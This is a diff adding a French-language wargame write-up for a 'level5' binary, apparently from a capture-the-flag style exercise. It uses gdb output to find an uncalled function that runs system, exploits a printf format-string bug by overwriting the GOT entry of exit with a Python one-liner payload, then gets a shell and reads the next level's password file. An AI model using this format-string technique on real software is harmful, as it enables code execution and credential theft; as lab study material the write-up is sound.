@@ -1,0 +1,56 @@
+(gdb) i functions
+0x080483d0  exit
+0x080483d0  exit@plt
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+main appelle n
+o jamais appele:
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x18,%esp
+   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	movl   $0x1,(%esp)
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+
+On veut y acceder, le fgets dans n() ne nous interesse pas car protege, contrairement a gets()
+Par contre un printf qui print directement la string qu'on a ecrit sur stdin, on va faire exploit
+
+(gdb) r
+Starting program: /home/user/level5/level5 
+AAAAAAAA %x %x %x %x %x %x
+AAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 20782520
+[Inferior 1 (process 21248) exited with code 01]
+
+L'arg 4 de printf est la ou est stocke notre input, le contenu de cette adresse peut etre modifie avec %[numero de l arg a modifier]$n,
+Ca ecrira le nombre de caracteres qu on a ecrits avant, on peut y ecrire la valeur qu on veut
+
+la prochaine etape dans n() est un exit, on va modifier son adresse avec celle de o()
+
+(gdb) disas exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:		jmp    *0x8049838
+   0x080483d6 <+6>:		push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+
+resume du payload:
+[adresse d'exit] <- pas l'adresse d'exit directement mais celle de la GOT, trouvable en faisant "disas exit" -> *0x8049838
++ [ ecrire n caracteres pour que ca soit egal a l adresse de o(),
+	0x080484a4 -> 134513828 en decimal,
+	on enleve 4 a cause de l adresse qu on a ecrite juste avant,
+	on va donc ecrire 134513824 caracteres ]
++ [%4$n] <- on ecrit dans le 4e arg
+
+python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c" + "%4$n"' > /tmp/exploit5
+
+cat /tmp/exploit5 - | ./level5
+
+>whoami
+level6
+>cat /home/user/level6/.pass
+[le flag]
